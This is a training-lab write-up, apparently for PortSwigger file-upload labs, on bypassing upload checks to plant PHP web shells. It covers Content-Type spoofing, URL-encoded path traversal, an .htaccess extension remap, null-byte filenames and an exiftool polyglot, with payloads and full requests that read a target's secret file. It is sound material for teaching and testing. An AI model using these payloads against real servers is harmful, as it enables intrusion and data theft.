# File Upload Vulnerabilities

## Description

This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.
To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.
You can log in to your own account using the following credentials: wiener:peter


### Remote code execution via web shell upload

Sometimes you need to try to prepare a file to run in order to output some intresting content

intresting request

/files/avatars/<YOUR-IMAGE>. 
 
```
<?php
echo file_get_contents('/home/carlos/secret');
?>
```
### Web shell upload via Content-Type restriction bypass
 
In some cases you need to change the content type 

```
Content-Type: application/x-php to "image/jpeg" or "image/png" to trick the security control
```
### Web shell upload via path traversal
 
 In other scenario you need to use directory trasversal to upload file and trick the control 
as shown below, because a folder could not have the 'x' permission, but the parent folder yes or the one mor upper

```
filename="exploit.php"
filename="../exploit.php" -> in this case the escape character is stripped by the back-end, 
therefore you need to URL encode it.
```
 
### Web shell upload via extension blacklist bypass
 
```
filename="%2e%2e%2fexploit.php" this will trick the back-end server and will allow you to have
the file available in the parent directory.
```


Another way is to Add another type of application for been executed by PHP
```
such as ".htaccess"
Here you set Content-Type: text/plain

in the content insert 
"AddType application/x-httpd-php .l33t"
```

This maps an arbitrary extension (.l33t) to the executable MIME type application/x-httpd-php. As the server uses the mod_php module,
 it knows how to handle this already.

 Example below, part of a common request

```
Conntent-Type: multipart/form-data; boundary=----WebKitFormBoundaryXW8dk5wmNMh6qgqs
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ab500b503f2f662c07b7e0a006e00f7.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundaryXW8dk5wmNMh6qgqs
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .l33t

------WebKitFormBoundaryXW8dk5wmNMh6qgqs
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryXW8dk5wmNMh6qgqs
Content-Disposition: form-data; name="csrf"

WGSGE9pIOzjOOr4FhraST4fctP3HPyRr
------WebKitFormBoundaryXW8dk5wmNMh6qgqs--

```

After adding this file, you need to insert this new file with the new extension as shown below:

```
Content-Disposition: form-data; name="avatar"; filename="exploit.l33t"
Content-Type: application/x-httpd-php

<?php
echo file_get_contents('/home/carlos/secret');
?>
```

In other scenario, you can trick controls in the back-end system,
 uploading a the file extension followed by the null payload as follow:
```
 Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.png"
Content-Type: image/png

<?php
echo file_get_contents('/home/carlos/secret');
?>
```
## Remote code execution via polyglot web shell upload
 
 
Another way to trick the server is to use exiftool and write metadata into an
image

```
This is a command mockup "exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
```




